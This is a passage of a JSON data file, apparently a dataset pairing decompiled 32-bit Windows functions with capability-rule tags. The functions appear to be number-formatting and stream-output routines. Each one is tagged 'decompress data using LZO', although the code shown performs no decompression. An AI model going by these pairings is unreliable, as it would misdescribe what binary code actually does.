0x10) != '\\0') goto code_r0x00475e1f;\ncode_r0x00475d55:\n        pcVar3 = *(arg_10h + 8);\n        ppcVar10 = ppcVar12;\n        if (pcVar3 <= pcVar13) goto code_r0x00475d63;\n    }\n    else {\n        ppcVar12[2] = pcVar13;\n        ppcVar12[1] = 0x2e;\n        *ppcVar12 = pcVar3;\n        ppcVar12[-1] = 0x475d34;\n        iVar7 = sub.msvcrt.dll_memchr();\n        if (iVar7 == 0) {\n            if ((*(var_48h + 0x10) != '\\0') &&\n               ((pcVar13 < 3 ||\n                (((s[1] < ':' && (var_58h = var_58h & 0xffffff00 | s[2],  s[2] - 0x30U < 10)) && ('/' < s[1]))))))\n            goto code_r0x00475e1f;\n            goto code_r0x00475d55;\n        }\n        pcVar14[iVar7 - s] = *(var_48h + 0x24);\n        if (*(var_48h + 0x10) == '\\0') goto code_r0x00475d55;\ncode_r0x00475e1f:\n        ppcVar12[-1] = 0x475e2e;\n        uVar16 = fcn.00437ed0();\n        iVar7 = -uVar16;\n        pcVar5 = ppcVar12 + iVar7 + 0x2f & 0xfffffff0;\n        bVar15 = (*s - 0x2bU & 0xfd) == 0;\n        pcVar3 = pcVar5;\n        if (bVar15) {\n            var_40h = pcVar14 + 1;\n            *pcVar5 = *pcVar14;\n            stack0xffffffcc = pcVar13 + -1;\n            pcVar3 = pcVar5 + 1;\n        }\n        pcVar13 = var_40h;\n        s = pcVar5;\n        *(ppcVar12 + iVar7 + 0x18) = &fcn.00475be0::var_31h + 1;\n        *(ppcVar12 + iVar7 + 0x14) = pcVar13;\n        iVar2 = var_48h;\n        *(ppcVar12 + iVar7 + 0x10) = pcVar3;\n        *(ppcVar12 + iVar7 + 0xc) = uVar16 >> 0x20;\n        *(ppcVar12 + iVar7 + 8) = *(iVar2 + 0x25);\n        *(ppcVar12 + iVar7 + 4) = *(iVar2 + 0xc);\n        *(ppcVar12 + iVar7) = *(iVar2 + 8);\n        *(ppcVar12 + iVar7 + -4) = 0x475e9e;\n        fcn.004756b0();\n        pcVar13 = stack0xffffffcc + bVar15;\n        ppcVar10 = ppcVar12 + iVar7 + -0x1c;\n        ppcVar12 = ppcVar12 + iVar7 + -0x1c;\n        stack0xffffffcc = pcVar13;\n        var_40h = s;\n        pcVar3 = *(arg_10h + 8);\n        if (pcVar3 <= pcVar13) goto code_r0x00475d63;\n    }\n    *(ppcVar10 + -4) = 0x475ec9;\n    iVar7 = fcn.00437ed0();\n    pcVar14 = var_40h;\n    iVar7 = -iVar7;\n    ppcVar12 = ppcVar10 + iVar7;\n    *(ppcVar10 + iVar7 + 0x14) = pcVar13;\n    *(ppcVar10 + iVar7 + 0xc) = pcVar14;\n    *(ppcVar10 + iVar7 + 0x10) = pcVar3;\n    *(ppcVar10 + iVar7 + 4) = var_54h;\n    *(ppcVar10 + iVar7 + 8) = ppcVar10 + iVar7 + 0x2f & 0xfffffff0;\n    *(ppcVar10 + iVar7) = arg_10h;\n    *(ppcVar10 + iVar7 + -4) = 0x475efa;\n    fcn.004aba90();\n    stack0xffffffcc = pcVar3;\n    var_40h = ppcVar10 + iVar7 + 0x2f & 0xfffffff0;\n    pcVar13 = pcVar3;\ncode_r0x00475d63:\n    pcVar3 = var_40h;\n    uVar8 = var_4ch;\n    *(arg_10h + 8) = 0;\n    if (var_4ch == '\\0') {\n        iVar7 = *var_44h;\n        ppcVar12[1] = pcVar13;\n        *ppcVar12 = pcVar3;\n        pcVar1 = *(iVar7 + 0x30);\n        ppcVar12[-1] = 0x475d88;\n        pcVar3 = (*pcVar1)();\n        if (pcVar3 != pcVar13) {\n            uVar8 = 1;\n        }\n    }\n    return CONCAT44(uVar8, var_44h) & 0xffffffffff;\n}\n",
        "token_count": 3478
    },
    "00476220": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00476220(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint32_t arg_18h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint extraout_ECX;\n    uchar *puVar7;\n    uint64_t uVar8;\n    uint32_t auStackY148 [2];\n    uchar auStack109 [5];\n    uint32_t var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    uint32_t var_58h;\n    uint32_t var_54h;\n    int32_t var_50h;\n    uint32_t var_4ch;\n    uint var_30h;\n    uint var_2ch;\n    uint var_19h;\n    uint var_ch;\n    \n    var_50h = arg_14h;\n    var_54h = *(arg_10h + 0xc);\n    if ((var_54h & 1) == 0) {\n        var_50h._0_1_ = arg_14h;\n        auStackY148[1] = 0x476264;\n        uVar8 = fcn.00474e00(arg_8h, arg_ch, arg_10h, var_50h, arg_18h & 0xff);\n        return uVar8 & 0xffffffff | (arg_ch & 0xffffff00 | uVar8 >> 0x20 & 0xff) << 0x20;\n    }\n    var_58h = arg_18h;\n    var_4ch = var_4ch & 0xffffff00 | arg_ch & 0xff;\n    auStackY148[1] = 0x476298;\n    iVar4 = fcn.0044da00(arg_10h + 0x6c);\n    if (var_58h == '\\0') {\n        var_58h = *(iVar4 + 0x1c);\n        iVar4 = *(iVar4 + 0x20);\n        iVar6 = *(arg_10h + 8);\n        if (iVar4 < iVar6) goto code_r0x00476304;\ncode_r0x004762b2:\n        *(arg_10h + 8) = 0;\n        if (var_4ch != '\\0') goto code_r0x004762df;\n    }\n    else {\n        var_58h = *(iVar4 + 0x14);\n        iVar4 = *(iVar4 + 0x18);\n        iVar6 = *(arg_10h + 8);\n        if (iVar6 <= iVar4) goto code_r0x004762b2;\ncode_r0x00476304:\n        var_60h = iVar6 - iVar4;\n        auStackY148[0] = 0x47631c;\n        var_5ch = iVar4;\n        iVar4 = fcn.00437ed0();\n        iVar4 = -iVar4;\n        *(&stack0xffffff78 + iVar4) = extraout_ECX;\n        var_64h = &stack0xffffff93 + iVar4 & 0xfffffff0;\n        *(&stack0xffffff70 + iVar4) = &stack0xffffff93 + iVar4 & 0xfffffff0;\n        *(&stack0xffffff74 + iVar4) = var_50h;\n        *(&stack0xffffff6c + iVar4) = 0x47633e;\n        sub.msvcrt.dll_memset();\n        uVar3 = var_58h;\n        iVar5 = var_5ch;\n        iVar6 = var_60h;\n        uVar2 = var_64h;\n        *(arg_10h + 8) = 0;\n        if ((var_54h & 0xb0) == 0x20) {\n            if (var_4ch != '\\0') goto code_r0x004762df;\n            iVar6 = *arg_8h;\n            *(&stack0xffffff74 + iVar4) = var_5ch;\n            var_4ch = iVar5;\n            *(&stack0xffffff70 + iVar4) = uVar3;\n            pcVar1 = *(iVar6 + 0x30);\n            puVar7 = &stack0xffffff6c + iVar4;\n            *(&stack0xffffff6c + iVar4) = 0x4763ae;\n            iVar6 = (*pcVar1)();\n            iVar4 = var_60h;\n            uVar2 = var_64h;\n            if (var_4ch == iVar6) {\n                iVar6 = *arg_8h;\n                *(puVar7 + -4) = var_60h;\n                *(puVar7 + -8) = uVar2;\n                pcVar1 = *(iVar6 + 0x30);\n                *(puVar7 + -0xc) = 0x4763cc;\n                iVar6 = (*pcVar1)();\n                var_4ch = iVar4 != iVar6;\n                goto code_r0x004762df;\n            }\ncode_r0x00476380:\n            var_4ch = 1;\n            goto code_r0x004762df;\n        }\n        var_50h = var_5ch;\n        if (var_4ch != '\\0') goto code_r0x004762df;\n        iVar5 = *arg_8h;\n        *(&stack0xffffff74 + iVar4) = var_60h;\n        *(&stack0xffffff70 + iVar4) = uVar2;\n        iVar5 = (**(iVar5 + 0x30))();\n        iVar4 = var_50h;\n        if (iVar6 != iVar5) goto code_r0x00476380;\n    }\n    auStackY148[1] = var_58h;\n    auStackY148[0] = 0x4762d3;\n    var_4ch = iVar4;\n    iVar4 = (**(*arg_8h + 0x30))();\n    var_4ch = var_4ch != iVar4;\ncode_r0x004762df:\n    return CONCAT44(arg_ch & 0xffffff00 | var_4ch & 0xff, arg_8h);\n}\n",
        "token_count": 1431
    },
    "00476510": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00476510(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    ushort *puVar10;\n    uint *puVar11;\n    uchar *puVar12;\n    uint uVar13;\n    ushort *puVar14;\n    ulong uVar15;\n    uint uStackY116;\n    int32_t iStackY112;\n    uchar auStack73 [5];\n    uint32_t var_40h;\n    uint32_t var_3ch;\n    ushort *var_38h;\n    uint var_34h;\n    int32_t *var_30h;\n    uint32_t var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_30h = arg_8h;\n    var_34h = arg_ch;\n    var_3ch = arg_14h;\n    iStackY112 = 0x47653c;\n    iVar5 = fcn.0044daf0(arg_10h + 0x6c);\n    var_2ch = iVar5 + 0x28;\n    uVar8 = *(arg_10h + 0xc);\n    uStackY116 = 0x476557;\n    iVar6 = fcn.00437ed0();\n    iVar6 = -iVar6;\n    puVar11 = &stack0xffffff90 + iVar6;\n    puVar12 = &stack0xffffff90 + iVar6;\n    var_40h = uVar8 & 0x4a;\n    uVar4 = var_40h != 0x40 && var_40h != 8;\n    var_2ch = var_2ch & 0xffffff00 | uVar4;\n    iVar7 = arg_18h;\n    if (arg_18h < 1) {\n        iVar7 = -arg_18h;\n        if (var_40h == 0x40 || var_40h == 8) {\n            iVar7 = arg_18h;\n        }\n    }\n    *(&stack0xffffff94 + iVar6) = iVar7;\n    *(&stack0xffffff98 + iVar6) = iVar5 + 0x28;\n    *(&stack0xffffffa0 + iVar6) = uVar4;\n    *(&stack0xffffff9c + iVar6) = uVar8;\n    *(&stack0xffffff90 + iVar6) = (&stack0xffffffb7 + iVar6 & 0xfffffff0) + 0x14;\n    var_38h = &stack0xffffffb7 + iVar6 & 0xfffffff0;\n    *(&stack0xffffff8c + iVar6) = 0x4765ad;\n    iVar7 = fcn.004bce50();\n    if (*(iVar5 + 0x10) == '\\0') {\n        puVar10 = var_38h + (0x14 - iVar7);\n        puVar14 = var_38h + (0x14 - iVar7);\n        if (var_2ch != '\\0') goto code_r0x004765d0;\ncode_r0x00476701:\n        puVar14 = puVar10;\n        if (((uVar8 & 0x200) != 0) && (arg_18h != 0)) {\n            if (var_40h == 0x40) {\n                iVar7 = iVar7 + 1;\n                puVar14 = puVar10 + -1;\n                *puVar14 = *(iVar5 + 0x30);\n            }\n            else {\n                iVar7 = iVar7 + 2;\n                puVar14 = puVar10 + -2;\n                puVar10[-1] = *(iVar5 + 0x28 + ((uVar8 >> 0xe & 1) + 2) * 2);\n                *puVar14 = *(iVar5 + 0x30);\n            }\n        }\ncode_r0x004765e3:\n        iVar6 = *(arg_10h + 8);\n        puVar11 = puVar12;\n        if (iVar6 <= iVar7) goto code_r0x004765ed;\n    }\n    else {\n        *(&stack0xffffff8c + iVar6) = 0x4766b4;\n        uVar15 = fcn.00437ed0();\n        iVar9 = uVar15 >> 0x20;\n        iVar3 = -uVar15;\n        puVar11 = &stack0xffffff90 + iVar3 + iVar6;\n        puVar12 = &stack0xffffff90 + iVar3 + iVar6;\n        *(&stack0xffffffa0 + iVar3 + iVar6) = iVar9;\n        *(&stack0xffffffa4 + iVar3 + iVar6) = iVar9 + iVar7 * 2;\n        puVar14 = (&stack0xffffffb7 + iVar3 + iVar6 & 0xfffffff0) + 4;\n        *(&stack0xffffff9c + iVar3 + iVar6) = *(iVar5 + 0xc);\n        var_38h = puVar14;\n        *(&stack0xffffff98 + iVar3 + iVar6) = *(iVar5 + 8);\n        uVar1 = *(iVar5 + 0x26);\n        *(&stack0xffffff90 + iVar3 + iVar6) = puVar14;\n        *(&stack0xffffff94 + iVar3 + iVar6) = uVar1;\n        *(&stack0xffffff8c + iVar3 + iVar6) = 0x4766ec;\n        iVar6 = fcn.004bd190();\n        iVar7 = iVar6 - var_38h >> 1;\n        puVar10 = var_38h;\n        puVar14 = var_38h;\n        if (var_2ch == '\\0') goto code_r0x00476701;\ncode_r0x004765d0:\n        puVar12 = puVar11;\n        if (arg_18h < 0) {\n            iVar7 = iVar7 + 1;\n            puVar14[-1] = *(iVar5 + 0x28);\n            puVar14 = puVar14 + -1;\n            goto code_r0x004765e3;\n        }\n        if ((uVar8 & 0x800) == 0) goto code_r0x004765e3;\n        iVar7 = iVar7 + 1;\n        puVar14 = puVar14 + -1;\n        *puVar14 = *(iVar5 + 0x2a);\n        iVar6 = *(arg_10h + 8);\n        if (iVar6 <= iVar7) goto code_r0x004765ed;\n    }\n    *(puVar11 + -4) = 0x476658;\n    uVar15 = fcn.00437ed0();\n    iVar5 = -uVar15;\n    uVar8 = var_3ch & 0xffff;\n    *(puVar11 + iVar5 + 0x14) = iVar7;\n    *(puVar11 + iVar5 + 4) = uVar8;\n    puVar14 = puVar11 + iVar5 + 0x27 & 0xfffffff0;\n    *(puVar11 + iVar5 + 0xc) = uVar15 >> 0x20;\n    *(puVar11 + iVar5 + 0x10) = iVar6;\n    *(puVar11 + iVar5 + 8) = puVar14;\n    *(puVar11 + iVar5) = arg_10h;\n    *(puVar11 + iVar5 + -4) = 0x476686;\n    fcn.004abd90();\n    iVar7 = iVar6;\n    puVar11 = puVar11 + iVar5;\ncode_r0x004765ed:\n    uVar13 = var_34h;\n    *(arg_10h + 8) = 0;\n    if (var_34h == '\\0') {\n        iVar6 = *var_30h;\n        puVar11[1] = iVar7;\n        *puVar11 = puVar14;\n        pcVar2 = *(iVar6 + 0x30);\n        puVar11[-1] = 0x47660f;\n        iVar6 = (*pcVar2)();\n        if (iVar6 != iVar7) {\n            uVar13 = 1;\n        }\n    }\n    return CONCAT44(uVar13, var_30h) & 0xffffffffff;\n}\n",
        "token_count": 1947
    },
    "00476760": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl fcn.00476760(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    ushort *puVar9;\n    int32_t iVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    uint *puVar13;\n    uint uVar14;\n    ushort *puVar15;\n    ulong uVar16;\n    uint uStackY116;\n    int32_t iStackY112;\n    uchar uStack73;\n    int32_t var_44h;\n    uint32_t var_40h;\n    uint32_t var_3ch;\n    ushort *var_38h;\n    uint var_34h;\n    char var_2dh;\n    int32_t *var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_2ch = arg_8h;\n    var_34h = arg_ch;\n    var_3ch = arg_14h;\n    iStackY112 = 0x47678c;\n    iVar4 = fcn.0044daf0(arg_10h + 0x6c);\n    uVar8 = *(arg_10h + 0xc);\n    uStackY116 = 0x4767a7;\n    var_44h = iVar4 + 0x28;\n    iVar5 = fcn.00437ed0();\n    iVar5 = -iVar5;\n    puVar12 = &stack0xffffff90 + iVar5;\n    puVar11 = &stack0xffffff90 + iVar5;\n    uVar6 = uVar8 & 0x4a;\n    *(&stack0xffffff98 + iVar5) = iVar4 + 0x28;\n    var_40h = uVar6;\n    *(&stack0xffffff9c + iVar5) = uVar8;\n    var_38h = &stack0xffffffb7 + iVar5 & 0xfffffff0;\n    var_2dh = uVar6 != 0x40 && uVar6 != 8;\n    *(&stack0xffffffa0 + iVar5) = var_2dh;\n    *(&stack0xffffff94 + iVar5) = arg_18h;\n    *(&stack0xffffff90 + iVar5) = (&stack0xffffffb7 + iVar5 & 0xfffffff0) + 0x14;\n    *(&stack0xffffff8c + iVar5) = 0x4767ed;\n    iVar7 = fcn.004bce50();\n    puVar9 = var_38h + (0x14 - iVar7);\n    if (*(iVar4 + 0x10) != '\\0') {\n        *(&stack0xffffff8c + iVar5) = 0x476872;\n        uVar16 = fcn.00437ed0();\n        iVar10 = uVar16 >> 0x20;\n        iVar3 = -uVar16;\n        puVar12 = &stack0xffffff90 + iVar3 + iVar5;\n        puVar11 = &stack0xffffff90 + iVar3 + iVar5;\n        *(&stack0xffffffa0 + iVar3 + iVar5) = iVar10;\n        *(&stack0xffffffa4 + iVar3 + iVar5) = iVar10 + iVar7 * 2;\n        puVar9 = (&stack0xffffffb7 + iVar3 + iVar5 & 0xfffffff0) + 4;\n        *(&stack0xffffff9c + iVar3 + iVar5) = *(iVar4 + 0xc);\n        var_38h = puVar9;\n        *(&stack0xffffff98 + iVar3 + iVar5) = *(iVar4 + 8);\n        uVar1 = *(iVar4 + 0x26);\n        *(&stack0xffffff90 + iVar3 + iVar5) = puVar9;\n        *(&stack0xffffff94 + iVar3 + iVar5) = uVar1;\n        *(&stack0xffffff8c + iVar3 + iVar5) = 0x4768aa;\n        iVar5 = fcn.004bd190();\n        iVar7 = iVar5 - var_38h >> 1;\n        puVar9 = var_38h;\n    }\n    puVar15 = puVar9;\n    if (((var_2dh == '\\0') && (puVar12 = puVar11,  (uVar8 & 0x200) != 0)) && (arg_18h != 0)) {\n        if (var_40h == 0x40) {\n            iVar7 = iVar7 + 1;\n            puVar15 = puVar9 + -1;\n            *puVar15 = *(iVar4 + 0x30);\n        }\n        else {\n            iVar7 = iVar7 + 2;\n            puVar15 = puVar9 + -2;\n            puVar9[-1] = *(var_44h + ((uVar8 >> 0xe & 1) + 2) * 2);\n            *puVar15 = *(iVar4 + 0x30);\n        }\n    }\n    iVar5 = *(arg_10h + 8);\n    puVar13 = puVar12;\n    if (iVar7 < iVar5) {\n        *(puVar12 + -4) = 0x476913;\n        uVar16 = fcn.00437ed0();\n        iVar4 = -uVar16;\n        puVar13 = puVar12 + iVar4;\n        uVar8 = var_3ch & 0xffff;\n        *(puVar12 + iVar4 + 0x14) = iVar7;\n        *(puVar12 + iVar4 + 4) = uVar8;\n        puVar15 = puVar12 + iVar4 + 0x27 & 0xfffffff0;\n        *(puVar12 + iVar4 + 0xc) = uVar16 >> 0x20;\n        *(puVar12 + iVar4 + 0x10) = iVar5;\n        *(puVar12 + iVar4 + 8) = puVar15;\n        *(puVar12 + iVar4) = arg_10h;\n        *(puVar12 + iVar4 + -4) = 0x476941;\n        fcn.004abd90();\n        iVar7 = iVar5;\n    }\n    uVar14 = var_34h;\n    *(arg_10h + 8) = 0;\n    if (var_34h == '\\0') {\n        iVar5 = *var_2ch;\n        puVar13[1] = iVar7;\n        *puVar13 = puVar15;\n        pcVar2 = *(iVar5 + 0x30);\n        puVar13[-1] = 0x47683c;\n        iVar5 = (*pcVar2)();\n        if (iVar5 != iVar7) {\n            uVar14 = 1;\n        }\n    }\n    return CONCAT44(uVar14, var_2ch) & 0xffffffffff;\n}\n",
        "token_count": 1609
    },
    "00476960": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.00476960(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h, uint32_t arg_18h, uint32_t arg_1ch)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint *puVar12;\n    uchar *puVar13;\n    uint32_t uVar14;\n    uint uVar15;\n    ushort *puVar16;\n    ushort *puVar17;\n    ulong uVar18;\n    uint uStackY116;\n    int32_t iStackY112;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint32_t var_3ch;\n    int32_t *var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_38h = arg_8h;\n    var_2ch = arg_1ch;\n    var_40h = arg_ch;\n    var_44h = arg_14h;\n    var_30h = arg_18h;\n    iStackY112 = 0x47699a;\n    iVar4 = fcn.0044daf0(arg_10h + 0x6c);\n    var_34h = iVar4 + 0x28;\n    var_48h = *(arg_10h + 0xc);\n    uStackY116 = 0x4769b8;\n    var_3ch = var_48h;\n    iVar5 = fcn.00437ed0();\n    iVar5 = -iVar5;\n    puVar12 = &stack0xffffff90 + iVar5;\n    puVar13 = &stack0xffffff90 + iVar5;\n    var_48h = var_48h & 0x4a;\n    uVar14 = &fcn.00476960::var_48h + iVar5 + 3 & 0xfffffff0;\n    bVar9 = var_48h != 0x40 && var_48h != 8;\n    uVar8 = bVar9;\n    var_34h = var_34h & 0xffffff00 | uVar8;\n    uVar6 = var_30h;\n    uVar10 = var_2ch;\n    if ((((var_2ch - 1) + (var_30h != 0) | var_2ch) < 0) && (bVar9)) {\n        uVar6 = -var_30h;\n        uVar10 = -(var_2ch + (var_30h != 0));\n    }\n    *(&stack0xffffff94 + iVar5) = uVar6;\n    *(&stack0xffffff98 + iVar5) = uVar10;\n    *(&stack0xffffffa4 + iVar5) = uVar8;\n    uVar8 = var_3ch;\n    *(&stack0xffffff90 + iVar5) = uVar14 + 0x50;\n    *(&stack0xffffffa0 + iVar5) = uVar8;\n    *(&stack0xffffff9c + iVar5) = iVar4 + 0x28;\n    *(&stack0xffffff8c + iVar5) = 0x476a23;\n    iVar7 = fcn.004bcf00();\n    puVar16 = uVar14 + (0x28 - iVar7) * 2;\n    if (*(iVar4 + 0x10) == '\\0') {\n        if (var_34h != '\\0') goto code_r0x00476a43;\ncode_r0x00476b7b:\n        puVar17 = puVar16;\n        if (((var_3ch & 0x200) != 0) && ((var_30h | var_2ch) != 0)) {\n            if (var_48h == 0x40) {\n                iVar7 = iVar7 + 1;\n                puVar17 = puVar16 + -1;\n                *puVar17 = *(iVar4 + 0x30);\n            }\n            else {\n                iVar7 = iVar7 + 2;\n                puVar17 = puVar16 + -2;\n                puVar16[-1] = *(iVar4 + 0x28 + ((var_3ch >> 0xe & 1) + 2) * 2);\n                *puVar17 = *(iVar4 + 0x30);\n            }\n        }\ncode_r0x00476a57:\n        iVar5 = *(arg_10h + 8);\n        puVar12 = puVar13;\n        if (iVar5 <= iVar7) goto code_r0x00476a61;\n    }\n    else {\n        *(&stack0xffffff8c + iVar5) = 0x476b34;\n        uVar18 = fcn.00437ed0();\n        iVar11 = uVar18 >> 0x20;\n        iVar3 = -uVar18;\n        puVar12 = &stack0xffffff90 + iVar3 + iVar5;\n        puVar13 = &stack0xffffff90 + iVar3 + iVar5;\n        *(&stack0xffffffa0 + iVar3 + iVar5) = iVar11;\n        *(&stack0xffffffa4 + iVar3 + iVar5) = iVar11 + iVar7 * 2;\n        puVar16 = (&fcn.00476960::var_48h + iVar3 + iVar5 + 3 & 0xfffffff0U) + 4;\n        *(&stack0xffffff9c + iVar3 + iVar5) = *(iVar4 + 0xc);\n        *(&stack0xffffff98 + iVar3 + iVar5) = *(iVar4 + 8);\n        uVar1 = *(iVar4 + 0x26);\n        *(&stack0xffffff90 + iVar3 + iVar5) = puVar16;\n        *(&stack0xffffff94 + iVar3 + iVar5) = uVar1;\n        *(&stack0xffffff8c + iVar3 + iVar5) = 0x476b69;\n        iVar5 = fcn.004bd190();\n        iVar7 = iVar5 - puVar16 >> 1;\n        if (var_34h == '\\0') goto code_r0x00476b7b;\ncode_r0x00476a43:\n        puVar13 = puVar12;\n        if (var_2ch < 0) {\n            iVar7 = iVar7 + 1;\n            puVar16[-1] = *(iVar4 + 0x28);\n            puVar17 = puVar16 + -1;\n            goto code_r0x00476a57;\n        }\n        puVar17 = puVar16;\n        if ((var_3ch & 0x800) == 0) goto code_r0x00476a57;\n        iVar7 = iVar7 + 1;\n        puVar17 = puVar16 + -1;\n        *puVar17 = *(iVar4 + 0x2a);\n        iVar5 = *(arg_10h + 8);\n        if (iVar5 <= iVar7) goto code_r0x00476a61;\n    }\n    *(puVar12 + -4) = 0x476ad6;\n    uVar18 = fcn.00437ed0();\n    iVar4 = -uVar18;\n    uVar8 = var_44h & 0xffff;\n    *(puVar12 + iVar4 + 0x14) = iVar7;\n    *(puVar12 + iVar4 + 4) = uVar8;\n    puVar17 = puVar12 + iVar4 + 0x27 & 0xfffffff0;\n    *(puVar12 + iVar4 + 0xc) = uVar18 >> 0x20;\n    *(puVar12 + iVar4 + 0x10) = iVar5;\n    *(puVar12 + iVar4 + 8) = puVar17;\n    *(puVar12 + iVar4) = arg_10h;\n    *(puVar12 + iVar4 + -4) = 0x476b04;\n    fcn.004abd90();\n    iVar7 = iVar5;\n    puVar12 = puVar12 + iVar4;\ncode_r0x00476a61:\n    uVar15 = var_40h;\n    *(arg_10h + 8) = 0;\n    if (var_40h == '\\0') {\n        iVar5 = *var_38h;\n        puVar12[1] = iVar7;\n        *puVar12 = puVar17;\n        pcVar2 = *(iVar5 + 0x30);\n        puVar12[-1] = 0x476a83;\n        iVar5 = (*pcVar2)();\n        if (iVar5 != iVar7) {\n            uVar15 = 1;\n        }\n    }\n    return CONCAT44(uVar15, var_38h) & 0xffffffffff;\n}\n",
        "token_count": 2070
    },
    "00476be0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.00476be0(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h, uint32_t arg_18h, uint32_t arg_1ch)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    ushort *puVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    uchar *puVar13;\n    uint *puVar14;\n    uint uVar15;\n    ushort *puVar16;\n    ulong uVar17;\n    uint uStackY116;\n    int32_t iStackY112;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    ushort *var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    int32_t *var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_2ch = arg_8h;\n    var_44h = arg_18h;\n    var_38h = arg_ch;\n    var_40h = arg_14h;\n    var_30h = arg_1ch;\n    iStackY112 = 0x476c18;\n    iVar4 = fcn.0044daf0(arg_10h + 0x6c);\n    var_34h = iVar4 + 0x28;\n    uVar8 = *(arg_10h + 0xc);\n    uStackY116 = 0x476c33;\n    iVar5 = fcn.00437ed0();\n    iVar5 = -iVar5;\n    puVar13 = &stack0xffffff90 + iVar5;\n    puVar12 = &stack0xffffff90 + iVar5;\n    uVar6 = uVar8 & 0x4a;\n    *(&stack0xffffff94 + iVar5) = arg_18h;\n    puVar10 = &fcn.00476be0::var_48h + iVar5 + 3 & 0xfffffff0;\n    var_48h = uVar6;\n    *(&stack0xffffffa0 + iVar5) = uVar8;\n    var_3ch = puVar10;\n    bVar9 = uVar6 != 0x40 && uVar6 != 8;\n    var_34h = var_34h & 0xffffff00 | bVar9;\n    *(&stack0xffffffa4 + iVar5) = bVar9;\n    uVar6 = var_30h;\n    *(&stack0xffffff9c + iVar5) = iVar4 + 0x28;\n    *(&stack0xffffff98 + iVar5) = uVar6;\n    *(&stack0xffffff90 + iVar5) = puVar10 + 0x28;\n    *(&stack0xffffff8c + iVar5) = 0x476c80;\n    iVar7 = fcn.004bcf00();\n    puVar10 = var_3ch + (0x28 - iVar7);\n    if (*(iVar4 + 0x10) == '\\0') {\n    }\n    else {\n        *(&stack0xffffff8c + iVar5) = 0x476d04;\n        uVar17 = fcn.00437ed0();\n        iVar11 = uVar17 >> 0x20;\n        iVar3 = -uVar17;\n        puVar13 = &stack0xffffff90 + iVar3 + iVar5;\n        puVar12 = &stack0xffffff90 + iVar3 + iVar5;\n        *(&stack0xffffffa0 + iVar3 + iVar5) = iVar11;\n        *(&stack0xffffffa4 + iVar3 + iVar5) = iVar11 + iVar7 * 2;\n        puVar10 = (&fcn.00476be0::var_48h + iVar3 + iVar5 + 3 & 0xfffffff0U) + 4;\n        *(&stack0xffffff9c + iVar3 + iVar5) = *(iVar4 + 0xc);\n        var_3ch = puVar10;\n        *(&stack0xffffff98 + iVar3 + iVar5) = *(iVar4 + 8);\n        uVar1 = *(iVar4 + 0x26);\n        *(&stack0xffffff90 + iVar3 + iVar5) = puVar10;\n        *(&stack0xffffff94 + iVar3 + iVar5) = uVar1;\n        *(&stack0xffffff8c + iVar3 + iVar5) = 0x476d3c;\n        iVar5 = fcn.004bd190();\n        iVar7 = iVar5 - var_3ch >> 1;\n        puVar10 = var_3ch;\n    }\n    puVar16 = puVar10;\n    if (((var_34h == '\\0') && (puVar13 = puVar12,  (uVar8 & 0x200) != 0)) && ((var_44h | var_30h) != 0)) {\n        if (var_48h == 0x40) {\n            